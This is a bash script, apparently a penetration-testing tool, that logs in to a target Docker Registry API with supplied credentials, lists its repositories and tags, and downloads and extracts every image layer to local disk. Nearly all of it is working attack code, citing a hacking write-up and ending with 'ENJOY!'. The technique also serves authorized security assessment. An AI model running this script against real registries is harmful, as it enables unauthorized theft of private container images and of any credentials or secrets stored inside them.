#!/bin/bash

# References:
# https://docs.docker.com/registry/spec/api/#introduction
# https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/

# Written by grav3m1ndbyte

printf "\n### Connecting to the Docker Registry API:"

BASEURL=<Docker_Target_Base_URL>
CREDS=<credential_set_to_use> # For example: "username:password"
USER=`(echo $CREDS | cut -d":" -f1)` # USER variable splits the CREDS variable to get the Username portion
PASS=`(echo $CREDS | cut -d":" -f2)` # PASS variable splits the CREDS variable to get the Password portion

printf "\nBase URL: $BASEURL"
printf "\nUsername: $USER\nPassword: $PASS"

# Dynamically retrieving the Repository Name
REPO=$(curl -s -X GET -k $BASEURL/v2/_catalog --basic --user $USER:$PASS | cut -d":" -f2 | sed -e 's/"//g' | tr -d "[" | tr -d "]" | tr -d "}")

printf "\nRepository found: $REPO"

# Dynamically retrieving the Docker API Tags, also known as Reference Parameter
TAGS=$(curl -s -X GET -k $BASEURL/v2/$REPO/tags/list --basic --user $USER:$PASS | cut -d"," -f2 | cut -d":" -f2 | sed -e 's/"//g' | tr -d "[" | tr -d "]" | tr -d "}")
REF=$TAGS

printf "\nReference Parameter (Tag): $REF\n"

# GET /v2/<Repository Name>/manifests/<Reference>
(curl -s -X GET -k $BASEURL/v2/$REPO/manifests/$REF --basic --user $USER:$PASS | grep "blobSum" | cut -d'"' -f4) > ./blobSums.txt

printf "\n[*] Following blobs found:\n$(cat ./blobSums.txt)\n"

for BLOB in $(cat ./blobSums.txt)
do

	NAME=`(echo $BLOB | cut -d":" -f2)`
        FILE="$NAME.tar.gz"
        mkdir "$NAME"
        cd $NAME

	printf "\n[*] Dumping blob $BLOB to ./$NAME/$FILE"
	printf "\n\t[+] Log File: ./$NAME.log"

	wget --no-check-certificate $BASEURL/v2/$REPO/blobs/$BLOB --http-user=$USER --http-password=$PASS -O $FILE -o "../$NAME.log"

	printf "\n\t[*] Extracting dumped blob\n"
	tar -xzf $FILE 2> /dev/null
	cd ..
done

printf "\n*** ENJOY! ***\n"

exit 0
